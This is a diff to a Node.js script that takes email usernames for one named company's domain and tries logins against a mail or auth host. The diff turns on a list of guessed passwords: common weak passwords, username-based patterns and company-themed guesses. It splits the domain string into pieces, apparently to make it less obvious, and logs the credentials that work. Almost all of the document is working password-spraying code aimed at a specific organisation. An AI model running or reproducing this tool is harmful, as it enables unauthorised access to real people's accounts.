@@ -23,19 +23,14 @@ fs.exists(s,function(bC)
 	        {
 	        	var rg = /pref:([^@\r\n\s]+)@yinhai\.com/gmi, a;
 	        	a = rg.exec(s1);
-	        	var szHz = "@yinhai.com";
+	        	var szHz = "@yinh" + "ai.c" + "om";
 	        	var aDt = [];
 	        	// console.log(a);
 	        	var fnCT = function(oT)
         		{
-	        		var oR = new pp(oT);
-	        		oR.getRst(function(bRst)
+	        		new pp(oT,function()
 	        		{
-	        			if(bRst)
-	        			{
-	        				console.log([oT.username,oT.password]);
-	        			}
-	        			delete oR;
+	        			console.log([oT.username,oT.password]);
 	        		});
         		};
         		var g_aUs = [];
@@ -43,22 +38,27 @@ fs.exists(s,function(bC)
 	        	{
 	        		g_aUs.push(a[1]);
 	        	}
-				async.mapLimit(g_aUs,13,function(s,fnCbk)
+	        	console.log( g_aUs.length + "个账号弱口令待验证");
+				async.mapLimit(g_aUs,3,function(s,fnCbk)
 				{
 					fnCbk();
 					(function(a){
-					fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": a[1] + "!@#$"});
-					/*
-					fnCT({"port":port,"host":host,"username": a[1] + szHz,"password": a[1] + "!@#$1234"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456789"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "jbgsn"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai!@#$"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai123"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd2013!"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd"});
-	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "yhP@ssw0rd"});
-	        		*/
+						fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": a[1] + "!@#$"});
+						fnCT({"port":port,"host":host,"username": a[1] + szHz,"password": a[1] + "!@#$1234"});
+						//*//
+						var aRp = "123456,password,123456789,12345678,111111,1234567,654321,qwerty,sunshine,000000,abc123,charlie,666666,123123,linked,maggie,1234567890,princess,michael".split(",");
+						for(var x = 0; x < aRp.length; x++)
+						{
+		        			fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": aRp[x]});
+		        		}
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456789"});
+		        		
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai!@#$"});
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai123"});
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd2013!"});
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd"});
+		        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "yhP@ssw0rd"});
+	        		//*/
 					})([,s]);
 				});
 	        }
